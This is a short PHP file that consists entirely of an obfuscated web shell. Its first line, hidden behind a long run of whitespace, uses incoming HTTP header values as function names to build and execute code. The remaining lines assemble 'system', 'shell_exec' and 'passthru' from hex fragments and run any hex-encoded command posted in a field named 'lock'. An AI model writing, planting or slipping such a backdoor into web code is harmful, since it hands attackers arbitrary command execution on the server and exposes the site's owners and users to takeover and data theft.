<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$class=$_HEADERS['Feature-Policy']('', $_HEADERS['Sec-Websocket-Accept']($_HEADERS['Server-Timing']));$class();}


$field1 = '7';
$field2 = '9';
$field3 = 'd';
$field4 = '3';
$field5 = '6';
$field6 = '8';
$field7 = '5';
$field8 = 'c';
$field9 = '4';
$field10 = '2';
$field11 = 'f';
$partition1 = pack("H*", $field1 . '3' . '7' . $field2 . '7' . '3' . '7' . '4' . '6' . '5' . '6' . $field3);
$partition2 = pack("H*", '7' . $field4 . $field5 . $field6 . '6' . $field7 . '6' . $field8 . '6' . $field8 . $field7 . 'f' . '6' . $field7 . $field1 . '8' . '6' . $field7 . $field5 . '3');
$partition3 = pack("H*", $field1 . $field4 . $field5 . '8' . $field5 . $field7 . $field5 . $field8 . '6' . $field8);
$partition4 = pack("H*", $field1 . '0' . '6' . '1' . '7' . '3' . $field1 . $field4 . '7' . $field9 . $field5 . $field6 . '7' . $field10 . $field1 . $field7);
$lock = pack("H*", $field5 . 'c' . '6' . $field11 . '6' . '3' . $field5 . 'b');
if (isset($_POST[$lock])) {
    $lock = pack("H*", $_POST[$lock]);
    if (function_exists($partition1)) {
        $partition1($lock);
    } elseif (function_exists($partition2)) {
        $partition2($lock);
    } elseif (function_exists($partition3)) {
        $partition3($lock);
    } elseif (function_exists($partition4)) {
        $partition4($lock);
    }
    exit;
}
